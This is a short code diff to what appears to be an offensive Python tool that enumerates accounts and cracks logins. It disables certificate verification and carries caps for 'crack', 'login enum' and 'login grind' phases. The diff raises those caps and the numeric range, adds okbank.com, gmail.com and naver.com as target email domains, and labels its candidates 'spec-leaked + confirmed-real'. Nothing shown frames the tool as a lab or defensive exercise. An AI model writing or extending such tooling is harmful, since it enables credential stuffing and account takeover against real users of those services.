@@ -36,10 +36,10 @@ CTX.verify_mode = ssl.CERT_NONE
 DELAY = float(os.environ.get("ORACLE_DELAY", "0.5"))
 PHASE_A_CAP = int(os.environ.get("ORACLE_ENUM_CAP", "120"))
 PHASE_B_CAP = int(os.environ.get("ORACLE_CRACK_CAP", "1200"))
-PHASE_D_CAP = int(os.environ.get("ORACLE_LOGIN_ENUM_CAP", "450"))
+PHASE_D_CAP = int(os.environ.get("ORACLE_LOGIN_ENUM_CAP", "800"))
 PHASE_E_CAP = int(os.environ.get("ORACLE_LOGIN_GRIND_CAP", "60"))
-NUM_RANGE = int(os.environ.get("ORACLE_NUM_MAX", "400"))
-EMAIL_DOMAINS = ["okbigyo.com"]
+NUM_RANGE = int(os.environ.get("ORACLE_NUM_MAX", "2000"))
+EMAIL_DOMAINS = ["okbigyo.com", "okbank.com", "gmail.com", "naver.com"]
 
 CANDIDATES = [
     # spec-leaked + confirmed-real
